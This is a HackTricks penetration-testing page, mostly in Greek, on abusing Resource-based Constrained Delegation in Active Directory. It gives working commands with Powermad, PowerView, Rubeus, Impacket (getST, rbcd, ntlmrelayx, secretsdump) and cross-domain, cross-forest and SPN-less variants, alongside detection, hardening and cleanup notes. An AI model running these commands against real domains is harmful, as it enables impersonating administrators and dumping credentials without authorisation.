# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Βασικά στοιχεία του Resource-based Constrained Delegation

Το Resource-based constrained delegation (RBCD) είναι παρόμοιο με το [constrained delegation](constrained-delegation.md), αλλά η κατεύθυνση εμπιστοσύνης είναι αντίστροφη. Το παραδοσιακό constrained delegation καταγράφει σε ποιες υπηρεσίες μπορεί να κάνει delegate ένας principal· το RBCD καταγράφει στον **πόρο-στόχο** ποιοι principals μπορούν να προσποιηθούν χρήστες προς αυτόν.<sup>[[12]](#references)</sup>

Το attribute _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ του αντικειμένου-στόχου περιέχει έναν security descriptor που προσδιορίζει τους principals που επιτρέπεται να ενεργούν για λογαριασμό άλλων identities σε αυτόν τον πόρο.

Μια ακόμη σημαντική διαφορά είναι ότι ένας principal με επαρκή **δικαιώματα εγγραφής σε έναν λογαριασμό μηχανήματος** (`GenericAll`, `GenericWrite`, `WriteDacl`, `WriteProperty` και παρόμοια δικαιώματα) ενδέχεται να μπορεί να ορίσει το _**msDS-AllowedToActOnBehalfOfOtherIdentity**_. Η διαμόρφωση του παραδοσιακού constrained delegation απαιτεί συνήθως πιο προνομιούχα πρόσβαση διαχείρισης.<sup>[[1]](#references)</sup>

Πιο συγκεκριμένα, η αλλαγή των ρυθμίσεων του κλασικού constrained delegation απαιτεί συνήθως το `SeEnableDelegationPrivilege` σε έναν domain controller, ένα δικαίωμα που συνήθως κατέχουν διαχειριστές με υψηλά προνόμια. Το RBCD μεταφέρει την απόφαση στον security descriptor του αντικειμένου-στόχου, επομένως η πρόσβαση εγγραφής στην αντίστοιχη ιδιότητα του αντικειμένου υπολογιστή μπορεί να αρκεί, χωρίς αυτό το δικαίωμα χρήστη.<sup>[[1]](#references)[[2]](#references)</sup>

### Νέες έννοιες

Το flag **`TrustedToAuthForDelegation`** στο `userAccountControl` συχνά περιγράφεται ως προϋπόθεση για το **S4U2Self**, αλλά αυτό δεν είναι όλη η αλήθεια.\
Ένα service principal με SPN μπορεί να ζητήσει S4U2Self χωρίς το flag. Με το `TrustedToAuthForDelegation`, το service ticket που επιστρέφεται είναι **forwardable**· χωρίς αυτό, το ticket είναι συνήθως **non-forwardable**.<sup>[[5]](#references)</sup>

Το παραδοσιακό constrained delegation απορρίπτει ένα **non-forwardable TGS** στο βήμα S4U2Proxy. Το RBCD μπορεί να δεχτεί αυτό το ticket S4U2Self, εφόσον ο security descriptor του στόχου εξουσιοδοτεί την υπηρεσία που υποβάλλει το αίτημα.<sup>[[1]](#references)[[2]](#references)[[16]](#references)</sup>

### Δομή της επίθεσης

> Αν έχετε **δικαιώματα ισοδύναμα με εγγραφή** σε έναν **λογαριασμό υπολογιστή**, ενδέχεται να αποκτήσετε προνομιούχα πρόσβαση σε αυτόν τον υπολογιστή.

Ας υποθέσουμε ότι ο επιτιθέμενος έχει ήδη **δικαιώματα ισοδύναμα με εγγραφή στο αντικείμενο του υπολογιστή-θύματος**.

1. Ο επιτιθέμενος **παραβιάζει** έναν λογαριασμό με **SPN** ή **δημιουργεί έναν** («Service A»). Από προεπιλογή, ένας πιστοποιημένος χρήστης του domain μπορεί να δημιουργήσει έως και 10 αντικείμενα υπολογιστή, όπως ορίζεται από το **_MachineAccountQuota_**· ένα αντικείμενο υπολογιστή παρέχει αυτόματα αξιοποιήσιμα SPN.
2. Ο επιτιθέμενος **καταχράται το προνόμιο WRITE** που έχει στον υπολογιστή-θύμα (ServiceB), ώστε να διαμορφώσει **resource-based constrained delegation και να επιτρέψει στο ServiceA να προσποιηθεί οποιονδήποτε χρήστη** προς αυτόν τον υπολογιστή-θύμα (ServiceB).
3. Ο επιτιθέμενος χρησιμοποιεί το Rubeus για να εκτελέσει μια **πλήρη επίθεση S4U** (S4U2Self και S4U2Proxy) από το Service A στο Service B, για έναν χρήστη **με προνομιούχα πρόσβαση στο Service B**.
   1. S4U2Self (από τον παραβιασμένο ή δημιουργημένο λογαριασμό SPN): ζητά ένα **TGS που αντιπροσωπεύει τον Administrator προς το Service A** (non-forwardable).
   2. S4U2Proxy: χρησιμοποιεί αυτό το **non-forwardable TGS** για να ζητήσει ένα service ticket που αντιπροσωπεύει τον **Administrator** προς τον **host-θύμα**.
   3. Το non-forwardable ticket μπορεί και πάλι να λειτουργήσει σε αυτή τη ροή RBCD, επειδή το Service A είναι εξουσιοδοτημένο στον security descriptor του πόρου-στόχου.
4. Ο επιτιθέμενος μπορεί να κάνει **pass-the-ticket** και να **προσποιηθεί** τον χρήστη, ώστε να αποκτήσει **πρόσβαση στο ServiceB του θύματος**.<sup>[[1]](#references)</sup>

Το `MachineAccountQuota=0` κλείνει την προεπιλεγμένη οδό δημιουργίας υπολογιστών, αλλά δεν καταργεί τα δικαιώματα εγγραφής στο αντικείμενο υπολογιστή-στόχου ούτε τον έλεγχο ενός υπάρχοντος λογαριασμού. Ένας ελεγχόμενος απλός χρήστης χωρίς SPN μπορεί μερικές φορές να χρησιμοποιηθεί ως principal για delegation μέσω της [μεθόδου U2U χωρίς SPN](#spn-less-cross-domain--cross-forest-rbcd), ακόμη και εντός ενός domain. Αυτή η οδός εξακολουθεί να απαιτεί αποτελεσματικό δικαίωμα εγγραφής RBCD, έλεγχο των διαπιστευτηρίων του χρήστη που κάνει delegation, impersonated identity που επιτρέπεται να γίνει delegated, συμβατή συμπεριφορά κρυπτογράφησης Kerberos και αλλαγή NT-hash που διαταράσσει τον λογαριασμό. Αντιμετωπίστε τα ως ξεχωριστές προϋποθέσεις· ένα κενό attribute RBCD ή μηδενικό quota από μόνο του δεν αποδεικνύει ούτε επιτυχία ούτε ασφάλεια.

Ένας υπάρχων descriptor RBCD μπορεί επίσης να περιλαμβάνει μια **ομάδα** αντί για τον υπολογιστή που κάνει delegation απευθείας. Αν ελέγχετε έναν λογαριασμό υπολογιστή με SPN και μπορείτε να τον προσθέσετε σε αυτή την ομάδα, η νέα συμμετοχή μπορεί να παρέχει τη διαδρομή delegation χωρίς να αλλάξετε το attribute RBCD του υπολογιστή-στόχου. Ελέγξτε το αποτελεσματικό ACL δικαιωμάτων εγγραφής συμμετοχής της ομάδας (συμπεριλαμβανομένων των deny ACEs), τη nested συμμετοχή και την ανανέωση token, το trustee SID του descriptor, τους περιορισμούς delegation του λογαριασμού που γίνεται impersonate και το SPN της υπηρεσίας-στόχου, πριν καταλήξετε ότι η διαδρομή λειτουργεί.

Για να ελέγξετε το _**MachineAccountQuota**_ του domain, μπορείτε να χρησιμοποιήσετε:

```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```

## Επίθεση

### Δημιουργία αντικειμένου υπολογιστή

Μπορείτε να δημιουργήσετε ένα αντικείμενο υπολογιστή μέσα στον τομέα χρησιμοποιώντας το **[powermad](https://github.com/Kevin-Robertson/Powermad):**<sup>[[3]](#references)[[4]](#references)</sup>

```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```

### Ρύθμιση παραμέτρων της ανάθεσης με περιορισμούς βάσει πόρων

**Χρήση της μονάδας PowerShell του Active Directory**<sup>[[4]](#references)</sup>

```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assign delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```

**Χρήση του powerview**<sup>[[3]](#references)</sup>

```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```

### Εκτέλεση πλήρους S4U attack (Windows/Rubeus)

Πρώτα δημιουργήσαμε το νέο Computer object με τον κωδικό `123456`, οπότε χρειαζόμαστε το hash αυτού του κωδικού:<sup>[[3]](#references)[[4]](#references)</sup>

```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```

Αυτό θα εμφανίσει τα hashes RC4 και AES για αυτόν τον λογαριασμό.\
Τώρα, μπορεί να πραγματοποιηθεί η επίθεση:<sup>[[3]](#references)[[4]](#references)</sup>

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```

Μπορείτε να δημιουργήσετε περισσότερα tickets για περισσότερες υπηρεσίες ζητώντας το μόνο μία φορά, χρησιμοποιώντας την παράμετρο `/altservice` του Rubeus:

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```

> [!CAUTION]
> Οι χρήστες μπορούν να επισημανθούν ως **"Ο λογαριασμός είναι ευαίσθητος και δεν μπορεί να χρησιμοποιηθεί για ανάθεση."** Αν αυτή η σημαία είναι ενεργοποιημένη, ο λογαριασμός δεν μπορεί να πλαστοπροσωπηθεί μέσω αυτής της ροής ανάθεσης. Το BloodHound εμφανίζει αυτή την ιδιότητα κατά την ανάλυση.

### Εργαλεία Linux: RBCD από άκρο σε άκρο με Impacket (2024+)

Αν εργάζεστε από Linux, μπορείτε να εκτελέσετε ολόκληρη την αλυσίδα RBCD χρησιμοποιώντας τα επίσημα εργαλεία Impacket:<sup>[[6]](#references)[[7]](#references)</sup>

```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```

Σημειώσεις
- Αν επιβάλλεται LDAP signing/LDAPS, χρησιμοποιήστε `impacket-rbcd -use-ldaps ...`.
- Προτιμήστε κλειδιά AES· πολλά σύγχρονα domains περιορίζουν το RC4. Τόσο το Impacket όσο και το Rubeus υποστηρίζουν ροές μόνο με AES.
- Το Impacket μπορεί να ξαναγράψει το `sname` ("AnySPN") για ορισμένα εργαλεία, αλλά όποτε είναι δυνατόν, χρησιμοποιήστε το σωστό SPN (π.χ., CIFS/LDAP/HTTP/HOST/MSSQLSvc).

## RBCD μεταξύ domains και forests

Αν το **delegating principal** που ελέγχετε βρίσκεται σε **διαφορετικό domain** (ή ακόμα και σε **διαφορετικό forest**) από τον **resource computer**, η κατάχρηση εξακολουθεί να είναι **RBCD**, αλλά η ροή των tickets δεν είναι πλέον η συνηθισμένη ροή ενός domain `S4U2Self -> S4U2Proxy`.

### RBCD μεταξύ domains: ρύθμιση του foreign principal με SID

Όταν ορίζετε το `msDS-AllowedToActOnBehalfOfOtherIdentity` από **διαφορετικό domain**, το foreign machine/user ενδέχεται **να μην μπορεί να επιλυθεί με βάση το όνομά του** στο LDAP του domain-στόχου. Σε αυτήν την περίπτωση, ρυθμίστε την καταχώριση delegation χρησιμοποιώντας το **SID** του foreign principal αντί για το sAMAccountName/UPN του.

Αυτό είναι ιδιαίτερα σχετικό κατά το relaying NTLM στο LDAP με το `ntlmrelayx.py`:<sup>[[9]](#references)</sup>

```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
  --no-dump --no-da --no-validate-privs \
  --delegate-access \
  --escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
  --sid
```

Σημειώσεις:
- Το `--sid` λέει στο `ntlmrelayx.py` να αντιμετωπίσει το `--escalate-user` ως SID, κάτι που απαιτείται όταν ο λογαριασμός που εκχωρεί την αντιπροσώπευση ανήκει σε διαφορετικό domain από το domain-στόχο.
- Ακόμη κι αν το εργαλείο εμφανίσει `User not found in LDAP`, η εγγραφή της αντιπροσώπευσης μπορεί να πετύχει, επειδή ο security descriptor αποθηκεύει απευθείας το ξένο SID.

### Διατομεακό RBCD: ακολουθία cross-realm S4U

Μόλις η ξένη principal προστεθεί στο `msDS-AllowedToActOnBehalfOfOtherIdentity`, η λειτουργική ροή μεταξύ domains είναι η εξής:<sup>[[9]](#references)[[13]](#references)</sup>

1. Λάβετε ένα **TGT** για την principal που εκχωρεί την αντιπροσώπευση, από το δικό της domain.
2. Ζητήστε ένα **referral TGT** για το `krbtgt/<target-domain>`.
3. Ζητήστε ένα **cross-realm S4U2Self referral** για τον χρήστη του οποίου θα γίνει η πλαστοπροσωπία, από τον DC του domain-στόχου.
4. Ζητήστε το πραγματικό ticket **S4U2Self** για αυτόν τον χρήστη, πίσω στο domain της principal που εκχωρεί την αντιπροσώπευση.
5. Εκτελέστε **S4U2Proxy** στο domain της principal που εκχωρεί την αντιπροσώπευση, για να λάβετε ένα referral ticket για το domain-στόχο.
6. Εκτελέστε το τελικό **S4U2Proxy** στον DC του domain-στόχου, για να λάβετε το service ticket για `cifs/host.target`, `host/host.target` κ.λπ.

Αυτός είναι ο λόγος που τα τυπικά εργαλεία Linux συχνά αποτυγχάνουν στο διατομεακό RBCD:<sup>[[9]](#references)</sup>
- Το **realm** του αιτήματος ενδέχεται να χρειάζεται να διαφέρει από το realm του TGT που χρησιμοποιείται στο `TGS-REQ`.
- Η αλυσίδα απαιτεί **ανεξάρτητα βήματα S4U2Proxy**, όχι μόνο `S4U2Self` ή `S4U2Self` ακολουθούμενο αμέσως από ένα μόνο `S4U2Proxy`.

### Διατομεακό RBCD από Linux

Η Synacktiv δημοσίευσε μια υλοποίηση του Impacket `getST.py` που αναπαράγει την ακολουθία cross-realm από Linux, χειριζόμενη ρητά τους δύο KDC:<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
  -dc-ip 192.168.90.131 \
  -targetdc 192.168.90.217 \
  -targetdomain asgard.local \
  -impersonate thor_adm \
  -spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
  ./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
  -k -no-pass -dc-ip 192.168.90.217
```

Σε επιχειρησιακό επίπεδο, τα νέα arguments είναι:
- `-dc-ip`: DC του **delegating** domain
- `-targetdomain`: domain του **resource computer**
- `-targetdc`: DC του **resource** domain

### Περιορισμοί του RBCD μεταξύ forests

Το RBCD μεταξύ forests έχει έναν σημαντικό περιορισμό: **ο χρήστης που γίνεται impersonate πρέπει να ανήκει στο ίδιο forest με το delegating principal**. Με άλλα λόγια, αν ο ελεγχόμενος λογαριασμός μηχανήματός σας βρίσκεται στο `valhalla.local` και το resource-στόχος στο `asgard.local`, γενικά **δεν μπορείτε** να κάνετε impersonate αυθαίρετους χρήστες του `asgard.local` προς αυτό το resource μέσω RBCD.<sup>[[9]](#references)</sup>

Εξακολουθεί να είναι εκμεταλλεύσιμο όταν:
- ο χρήστης του **delegating forest** είναι **local admin** (ή έχει άλλα προνόμια) στο host του resource στο άλλο forest
- ένα trust επιτρέπει την απαιτούμενη διαδρομή authentication και το foreign SID γίνεται αποδεκτό στο security descriptor του target computer

### Ιδιαιτερότητες του πρωτοκόλλου RBCD μεταξύ forests

Το RBCD μεταξύ forests δεν είναι απλώς «cross-domain συν ένα trust». Η παρατηρούμενη ροή περιλαμβάνει δύο ιδιαιτερότητες που συχνά παραλείπουν τα κοινά εργαλεία:<sup>[[9]](#references)</sup>

1. Ένα επιπλέον αίτημα **S4U2Proxy** που ορίζει **`PA-PAC-OPTIONS=branch-aware`**
2. Ένα τελικό service ticket που ενδέχεται να επιστραφεί με χρήση **RC4**, ακόμα κι όταν ζητήθηκαν άλλοι τύποι etype

Η πρακτική ροή είναι:

1. Λάβετε ένα TGT για το delegating principal στο forest A.
2. Ζητήστε **S4U2Self** για τον χρήστη που θα γίνει impersonate στο forest A.
3. Ζητήστε **S4U2Proxy** στο forest A, για να λάβετε ένα referral TGT για το forest B.
4. Στείλτε ένα δεύτερο **S4U2Proxy** στο forest A **χωρίς** το S4U2Self ticket ως additional ticket, αλλά με ενεργοποιημένο το `branch-aware`, για να λάβετε ένα ακόμη referral TGT για το forest B.
5. Προαιρετικά, ζητήστε ένα κανονικό service ticket στο forest B για το delegating principal (αυτό το ticket δεν απαιτείται για την τελική εκμετάλλευση).
6. Χρησιμοποιήστε τα referral tickets από τα βήματα 3 και 4 για να ζητήσετε το τελικό **S4U2Proxy** ticket στο forest B, για τον χρήστη του forest A που γίνεται impersonate, προς το target SPN.

### RBCD μεταξύ forests από Linux

Το ίδιο Synacktiv Impacket branch προσθέτει ένα switch `-forest` για αυτή τη λογική:<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
  -impersonate 'v_thor' \
  -dc-ip VALHALLA.local \
  valhalla.local/'desktop$' \
  -targetdc ASGARD.local \
  -targetdomain asgard.local \
  -aesKey 4[...]f \
  -forest
```

### Αναδρομικό RBCD σε πολλά domain (3+ domain)

Σε **forest με πολλά domain**, τόσο τα **S4U2Self** όσο και τα **S4U2Proxy** μπορούν να εκτελούνται **αναδρομικά**, αντί να σταματούν μετά από ένα referral:

- **Αναδρομικό S4U2Self**: το πρώτο `S4U2Self` αποστέλλεται στο **domain του χρήστη που γίνεται impersonate**, διασχίζονται τα ενδιάμεσα βήματα μεταξύ parent/child με κανονικά referrals `TGS-REQ` για `krbtgt/<REALM>` και το **τελικό `S4U2Self`** αποστέλλεται στο **domain του delegating principal**.
- Αυτό σημαίνει ότι **αρκεί να έχεις μόνο ένα TGT** για έναν machine account, ώστε να κάνεις impersonate έναν **admin από άλλο domain στο ίδιο forest** και να ζητήσεις `cifs/host`, `host/host`, `wsman/host` κ.λπ.
- Το **αναδρομικό S4U2Proxy** ακολουθεί την ίδια trust chain: στα ενδιάμεσα βήματα επαναχρησιμοποιείται το προηγούμενο ticket ως TGT, ενώ ζητείται το επόμενο referral `krbtgt/<REALM>`. Μόνο το τελευταίο βήμα επιστρέφει το τελικό service ticket.<sup>[[10]](#references)</sup>

Ένα πρακτικό παράδειγμα εντός του ίδιου forest είναι το εξής:

```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
  -impersonate Administrator@frperso.local -self \
  -altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
  smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```

### RBCD χωρίς SPN μεταξύ domains / forests

Αν το **delegating principal είναι χρήστης χωρίς SPN**, το τελευταίο αναδρομικό `S4U2Self` αποτυγχάνει με **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**. Η λύση είναι να **επαναλάβετε μόνο το τελικό βήμα ως `S4U2Self+U2U`**.<sup>[[10]](#references)</sup>

Σύντομη περιγραφή της αλυσίδας κατάχρησης:

1. Κάντε authenticate με το **NT hash**, ώστε το KDC να κατευθυνθεί προς **RC4-HMAC (etype 23)**.
2. Ζητήστε πρώτα **`-self -u2u`** και κρατήστε αυτό το ticket ξεχωριστά από το μεταγενέστερο proxy βήμα.
3. Εξαγάγετε το **TGT session key** με το `describeTicket.py`.
4. Αντικαταστήστε το **NT hash** του χρήστη με αυτό το **session key** χρησιμοποιώντας το `changepasswd.py -newhashes <session_key>`.
5. Χρησιμοποιήστε ξανά το ticket `S4U2Self+U2U` ως **`-additional-ticket`** σε ξεχωριστό αίτημα **`-proxy`**.

```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
  -impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
  -hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
  -impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
  -spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```

Λειτουργικές επισημάνσεις:

- Όταν το **πρώτο trusted hop είναι ήδη άλλο forest**, προτιμήστε τον αλγόριθμο **branch-aware** (`getST.py ... -forest`) για να ταιριάζει με τη φυσική συμπεριφορά των Windows. Αν το foreign forest προσεγγίζεται μόνο **αργότερα** στην αλυσίδα, η αναδρομική ροή non-branch-aware μπορεί και πάλι να λειτουργήσει.<sup>[[9]](#references)</sup>
- Σε πρόσφατους DC με **Windows Server 2022/2025**, η επιβολή του RC4 μπορεί να αποτύχει με **`KDC_ERR_ETYPE_NOSUPP`** λόγω της κατάργησης του RC4· αυτό μπορεί να καταστήσει αδύνατο το **SPN-less RBCD**, παρότι το κλασικό RBCD που βασίζεται σε SPN εξακολουθεί να λειτουργεί με AES.<sup>[[15]](#references)</sup>
- Εκτελέστε το **`S4U2Self+U2U` πριν αλλάξετε το hash/password του χρήστη**: το **`SamrChangePasswordUser`** δεν επανυπολογίζει τα Kerberos AES keys του λογαριασμού, επομένως η αλλαγή password πρώτα μπορεί να διακόψει μεταγενέστερα αιτήματα ticket.<sup>[[14]](#references)</sup>
- Ο λογαριασμός που γίνεται impersonate πρέπει να εξακολουθεί να είναι **delegable**: τα **Protected Users** και οι λογαριασμοί με **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"** μπλοκάρουν την αλυσίδα.

## Σημειώσεις για εντοπισμό / ενίσχυση ασφάλειας

- Οι διαδρομές RBCD μεταξύ domains/forests συνήθως εξακολουθούν να δημιουργούνται μέσω **ACL abuse** ή **relay-to-LDAP**. Εφαρμόστε **LDAP signing** και **LDAP channel binding** στους DC για να διακόψετε συνήθεις διαδρομές εγκατάστασης.
- Ελέγξτε ποιοι μπορούν να γράψουν το `msDS-AllowedToActOnBehalfOfOtherIdentity` σε αντικείμενα computer και επιλύστε τα αποθηκευμένα SIDs, συμπεριλαμβανομένων των **foreign security principals**.
- Σε περιβάλλοντα με πολλά trusts, ελέγξτε το **Selective Authentication**, το **SID filtering** και αν χρήστες από foreign forest έχουν δικαιώματα **local admin** σε resource hosts.

### Πρόσβαση

Η τελευταία γραμμή εντολών θα εκτελέσει την **πλήρη επίθεση S4U και θα εισαγάγει το TGS** από τον Administrator στον host του θύματος, στη **μνήμη**.\
Σε αυτό το παράδειγμα ζητήθηκε TGS για την υπηρεσία **CIFS** από τον Administrator, οπότε θα μπορείτε να αποκτήσετε πρόσβαση στο **C$**:

```bash
ls \\victim.domain.local\C$
```

### Κατάχρηση διαφορετικών service tickets

Μάθετε για τα [**διαθέσιμα service tickets εδώ**](silver-ticket.md#available-services).

## Απαρίθμηση, έλεγχος και εκκαθάριση

### Απαρίθμηση υπολογιστών με ρυθμισμένο RBCD

PowerShell (αποκωδικοποίηση του SD για επίλυση των SID):

```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
  Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
  ForEach-Object {
    $raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
    $sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
    $sd.DiscretionaryAcl | ForEach-Object {
      $sid  = $_.SecurityIdentifier
      try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
      [PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
    }
  }
```

Impacket (ανάγνωση ή εκκαθάριση με μία εντολή):

```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```

### Καθαρισμός / επαναφορά RBCD

- PowerShell (διαγραφή του attribute):

```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```

- Impacket:

```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```

## Σφάλματα Kerberos

- **`KDC_ERR_ETYPE_NOTSUPP`**: Αυτό σημαίνει ότι το kerberos έχει ρυθμιστεί να μη χρησιμοποιεί DES ή RC4 και παρέχετε μόνο το hash RC4. Δώστε στο Rubeus τουλάχιστον το hash AES256 (ή δώστε του απλώς τα hashes rc4, aes128 και aes256). Παράδειγμα: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** κατά τη χρήση του `-self` για έναν κανονικό χρήστη: η principal που κάνει delegation πιθανότατα **δεν έχει SPN**. Δοκιμάστε ξανά το **τελευταίο hop** ως **`S4U2Self+U2U`** αντί για κανονικό `S4U2Self`.<sup>[[10]](#references)</sup>
- **`KDC_ERR_ETYPE_NOSUPP`** κατά το **SPN-less RBCD**: τα νεότερα DC μπορεί να απορρίψουν τη διαδρομή **RC4-HMAC** που απαιτείται από το τέχνασμα `S4U2Self+U2U` + αντικατάστασης session key. Δοκιμάστε μια κλασική διαδρομή **SPN-backed** RBCD με AES.<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**: Αυτό σημαίνει ότι η ώρα του τρέχοντος υπολογιστή διαφέρει από την ώρα του DC και το kerberos δεν λειτουργεί σωστά.
- **`preauth_failed`**: Αυτό σημαίνει ότι το όνομα χρήστη και τα hashes που δόθηκαν δεν λειτουργούν για login. Ίσως ξεχάσατε να βάλετε το "$" μέσα στο όνομα χρήστη κατά τη δημιουργία των hashes (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Αυτό μπορεί να σημαίνει ότι:
  - Ο χρήστης που προσπαθείτε να κάνετε impersonate δεν μπορεί να αποκτήσει πρόσβαση στην επιθυμητή υπηρεσία (επειδή δεν μπορείτε να τον κάνετε impersonate ή επειδή δεν έχει αρκετά privileges)
  - Η υπηρεσία που ζητήσατε δεν υπάρχει (αν ζητήσετε ticket για winrm αλλά το winrm δεν εκτελείται)
  - Το fakecomputer που δημιουργήθηκε έχει χάσει τα privileges του στον ευάλωτο server και πρέπει να του τα παραχωρήσετε ξανά.
  - Κάνετε κατάχρηση του κλασικού KCD· θυμηθείτε ότι το RBCD λειτουργεί με non-forwardable tickets S4U2Self, ενώ το KCD απαιτεί forwardable.

## Σημειώσεις, relays και εναλλακτικές

- Μπορείτε επίσης να γράψετε το RBCD SD μέσω του AD Web Services (ADWS), αν το LDAP είναι filtered. Δείτε:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Οι αλυσίδες Kerberos relay συχνά καταλήγουν σε RBCD για να αποκτήσουν local SYSTEM σε ένα βήμα. Δείτε πρακτικά παραδείγματα από άκρη σε άκρη:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Αν το LDAP signing/channel binding είναι **disabled** και μπορείτε να δημιουργήσετε machine account, εργαλεία όπως το **KrbRelayUp** μπορούν να κάνουν relay ένα coerced Kerberos auth στο LDAP, να ορίσουν το `msDS-AllowedToActOnBehalfOfOtherIdentity` για το machine account σας στο computer object του target και να κάνουν αμέσως impersonate τον **Administrator** μέσω S4U από μηχάνημα εκτός host.<sup>[[8]](#references)</sup>

## References

- [1] [Κουνώντας τον σκύλο: Κατάχρηση του Resource-Based Constrained Delegation για επίθεση στο Active Directory](https://eladshamir.com/2019/01/28/Wagging-the-Dog.html)
- [2] [Μια ακόμη λέξη για το Delegation – harmj0y](https://blog.harmj0y.net/redteaming/another-word-on-delegation/)
